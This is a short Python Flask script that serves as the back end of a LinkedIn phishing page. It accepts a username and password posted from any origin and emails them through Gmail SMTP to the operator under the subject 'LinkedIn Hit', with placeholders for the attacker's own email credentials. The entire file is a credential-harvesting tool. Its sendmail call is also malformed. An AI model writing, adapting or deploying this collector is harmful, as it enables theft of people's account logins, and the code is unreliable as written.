import os
from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# PASTE YOUR DETAILS HERE
MY_EMAIL = "your_email@gmail.com" 
MY_APP_PASS = "your16charpassword"

@app.route('/', methods=['POST', 'OPTIONS'])
def catch():
    if request.method == 'OPTIONS':
        response = app.make_default_options_response()
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return response
    
    data = request.json
    user = data.get('u')
    passw = data.get('p')
    
    try:
        msg = MIMEText(f"USER: {user}\nPASS: {passw}")
        msg['Subject'] = 'LinkedIn Hit'
        msg['From'] = MY_EMAIL
        msg['To'] = MY_EMAIL
        
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(MY_EMAIL, MY_APP_PASS)
        s.sendmail(msg)
        s.quit()
        
        resp = jsonify({"ok": True})
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp
    except Exception as e:
        resp = jsonify({"error": str(e)})
        resp.headers['Access-Control-Allow-Origin'] = '*'
        return resp
